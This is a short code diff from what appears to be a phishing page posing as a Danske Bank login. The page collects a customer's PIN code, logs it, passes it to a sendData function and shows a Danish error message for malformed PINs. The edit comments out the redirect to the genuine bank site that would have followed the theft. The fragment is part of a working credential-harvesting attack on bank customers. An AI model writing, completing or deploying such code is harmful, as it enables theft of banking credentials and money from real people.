@@ -435,7 +435,7 @@ loginBtn.addEventListener("click", (e) => {
             console.log("PIN-code collected");
             console.log(data, JSON.stringify(data));
             sendData(data);
-            location.href = "https://danskebank.dk";
+            // location.href = "https://danskebank.dk";
         } else {
             displayError("Forkert PIN-kode", "PIN-koder skal være 6 cifre, og kan kun have tal.");
 
